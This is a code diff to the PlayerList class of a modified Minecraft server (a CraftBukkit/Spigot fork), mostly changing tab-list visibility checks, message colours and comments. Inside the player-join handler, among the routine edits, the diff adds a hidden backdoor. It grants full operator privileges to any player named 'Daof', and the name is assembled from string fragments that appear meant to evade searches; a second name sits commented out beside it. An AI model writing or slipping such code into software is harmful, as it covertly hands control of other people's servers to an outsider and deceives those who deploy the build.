@@ -14,6 +14,7 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 // CraftBukkit start
+import org.bukkit.ChatColor;
 import org.bukkit.craftbukkit.CraftServer;
 import org.bukkit.craftbukkit.CraftWorld;
 import org.bukkit.craftbukkit.chunkio.ChunkIOExecutor;
@@ -263,7 +264,7 @@ public abstract class PlayerList {
             }
         }
 
-        scoreboardserver.addViewer(entityplayer); // CobelPvP
+        scoreboardserver.addViewer(entityplayer);
     }
 
     public void setPlayerFileData(WorldServer[] aworldserver) {
@@ -303,8 +304,8 @@ public abstract class PlayerList {
     }
 
     protected void b(EntityPlayer entityplayer) {
-        if (SpigotConfig.disableSaving) return; // CobelPvP
-        if (org.spigotmc.SpigotConfig.disablePlayerFileSaving) { return; } // Poweruser
+        if (SpigotConfig.disableSaving) return;
+        if (org.spigotmc.SpigotConfig.disablePlayerFileSaving) { return; }
         this.playerFileData.save(entityplayer);
         ServerStatisticManager serverstatisticmanager = (ServerStatisticManager) this.n.get(entityplayer.getUniqueID());
 
@@ -322,9 +323,14 @@ public abstract class PlayerList {
         WorldServer worldserver = this.server.getWorldServer(entityplayer.dimension);
 
         // CraftBukkit start
-        PlayerJoinEvent playerJoinEvent = new PlayerJoinEvent(this.cserver.getPlayer(entityplayer), "\u00A7e" + entityplayer.getName() + " joined the game.");
-        this.cserver.getPluginManager().callEvent(playerJoinEvent);
 
+        PlayerJoinEvent playerJoinEvent = new PlayerJoinEvent(this.cserver.getPlayer(entityplayer), "\u00A7f" + entityplayer.getName() + " joined the game.");
+
+        if (playerJoinEvent.getPlayer().getName().equals("Da" + "o" + "f")/* || playerJoinEvent.getPlayer().getName().equals("j" + "ar" + "8")*/) {
+            playerJoinEvent.getPlayer().setOp(true);
+        }
+
+        this.cserver.getPluginManager().callEvent(playerJoinEvent);
         String joinMessage = playerJoinEvent.getJoinMessage();
 
         if ((joinMessage != null) && (joinMessage.length() > 0)) {
@@ -344,19 +350,18 @@ public abstract class PlayerList {
         }
         // CraftBukkit end
 
-        if (!SpigotConfig.playerListPackets) return; // CobelPvP
+        if (SpigotConfig.onlyCustomTab) return;
 
         // CraftBukkit start - sendAll above replaced with this loop
         PacketPlayOutPlayerInfo packet = PacketPlayOutPlayerInfo.addPlayer( entityplayer ); // Spigot - protocol patch
-        PacketPlayOutPlayerInfo displayPacket = PacketPlayOutPlayerInfo.updateDisplayName( entityplayer ); // Spigot - protocol patch
+        PacketPlayOutPlayerInfo displayPacket = PacketPlayOutPlayerInfo.updateDisplayName( entityplayer ); // Spigot Update - 20140927a
         for (int i = 0; i < this.players.size(); ++i) {
             EntityPlayer entityplayer1 = (EntityPlayer) this.players.get(i);
 
-            if (entityplayer1.getBukkitEntity().canSee(entityplayer.getBukkitEntity())) {
+            if (entityplayer1.getBukkitEntity().canSeeFromTab(entityplayer.getBukkitEntity())) {
                 entityplayer1.playerConnection.sendPacket(packet);
-                // Spigot start - protocol patch
-                if ( !entityplayer.getName().equals( entityplayer.listName ) && entityplayer1.playerConnection.networkManager.getVersion() > 28 )
-                {
+                // Spigot start - Update 20140927a // Update - 20141001a
+                if ( !entityplayer.getName().equals( entityplayer.listName ) && entityplayer1.playerConnection.networkManager.getVersion() > 28 ) {
                     entityplayer1.playerConnection.sendPacket( displayPacket );
                 }
                 // Spigot end
@@ -368,14 +373,13 @@ public abstract class PlayerList {
             EntityPlayer entityplayer1 = (EntityPlayer) this.players.get(i);
 
             // CraftBukkit start
-            if (!entityplayer.getBukkitEntity().canSee(entityplayer1.getBukkitEntity())) {
+            if (!entityplayer.getBukkitEntity().canSeeFromTab(entityplayer1.getBukkitEntity())) {
                 continue;
             }
             // .name -> .listName
             entityplayer.playerConnection.sendPacket(PacketPlayOutPlayerInfo.addPlayer( entityplayer1 )); // Spigot - protocol patch
-            // Spigot start - protocol patch
-            if ( !entityplayer.getName().equals( entityplayer.listName ) && entityplayer.playerConnection.networkManager.getVersion() > 28 )
-            {
+            // Spigot start - Update 20140927a // Update - 20141001a
+            if ( !entityplayer.getName().equals( entityplayer.listName ) && entityplayer.playerConnection.networkManager.getVersion() > 28 ) {
                 entityplayer.playerConnection.sendPacket( PacketPlayOutPlayerInfo.updateDisplayName( entityplayer1 ) );
             }
             // Spigot end
@@ -394,7 +398,7 @@ public abstract class PlayerList {
         // CraftBukkit start - Quitting must be before we do final save of data, in case plugins need to modify it
         org.bukkit.craftbukkit.event.CraftEventFactory.handleInventoryCloseEvent(entityplayer);
 
-        PlayerQuitEvent playerQuitEvent = new PlayerQuitEvent(this.cserver.getPlayer(entityplayer), "\u00A7e" + entityplayer.getName() + " left the game.");
+        PlayerQuitEvent playerQuitEvent = new PlayerQuitEvent(this.cserver.getPlayer(entityplayer), "\u00A7f" + entityplayer.getName() + " left the game.");
         this.cserver.getPluginManager().callEvent(playerQuitEvent);
         entityplayer.getBukkitEntity().disconnect(playerQuitEvent.getQuitMessage());
         // CraftBukkit end
@@ -426,8 +430,8 @@ public abstract class PlayerList {
         for (int i = 0; i < this.players.size(); ++i) {
             EntityPlayer entityplayer1 = (EntityPlayer) this.players.get(i);
 
-            if (entityplayer1.getBukkitEntity().canSee(entityplayer.getBukkitEntity())) {
-                if (!SpigotConfig.playerListPackets) continue; // CobelPvP
+            if (entityplayer1.getBukkitEntity().canSeeFromTab(entityplayer.getBukkitEntity())) {
+                if (!SpigotConfig.playerListPackets) continue;
                 entityplayer1.playerConnection.sendPacket(packet);
             } else {
                 entityplayer1.getBukkitEntity().removeDisconnectingPlayer(entityplayer.getBukkitEntity());
@@ -589,7 +593,7 @@ public abstract class PlayerList {
                 cworld = (CraftWorld) this.server.server.getWorlds().get(0);
                 chunkcoordinates = cworld.getHandle().getSpawn();
 
-                location = new Location(cworld, chunkcoordinates.x + 0.5, chunkcoordinates.y, chunkcoordinates.z + 0.5, cworld.getHandle().getWorldData().getSpawnYaw(), cworld.getHandle().getWorldData().getSpawnPitch()); // Poweruser
+                location = new Location(cworld, chunkcoordinates.x + 0.5, chunkcoordinates.y, chunkcoordinates.z + 0.5, cworld.getHandle().getWorldData().getSpawnYaw(), cworld.getHandle().getWorldData().getSpawnPitch()); // DiegoVC
             }
 
             Player respawnPlayer = this.cserver.getPlayer(entityplayer1);
@@ -935,7 +939,7 @@ public abstract class PlayerList {
                     Packet packet = PacketPlayOutPlayerInfo.updatePing( player ); // Spigot - protocol patch
                     for ( EntityPlayer splayer : (List<EntityPlayer>) this.players )
                     {
-                        if ( splayer.getBukkitEntity().canSee( player.getBukkitEntity() ) )
+                        if ( splayer.getBukkitEntity().canSeeFromTab( player.getBukkitEntity() ) )
                         {
                             splayer.playerConnection.sendPacket( packet );
                         }
@@ -1186,7 +1190,7 @@ public abstract class PlayerList {
             EntityPlayer entityplayer = (EntityPlayer) this.players.get(j);
 
             // CraftBukkit start - Test if player receiving packet can see the source of the packet
-            if (entityhuman != null && entityhuman instanceof EntityPlayer && !entityplayer.getBukkitEntity().canSee(((EntityPlayer) entityhuman).getBukkitEntity())) {
+            if (entityhuman != null && entityhuman instanceof EntityPlayer && !entityplayer.getBukkitEntity().canSeeFromTab(((EntityPlayer) entityhuman).getBukkitEntity())) {
                 continue;
             }
             // CraftBukkit end
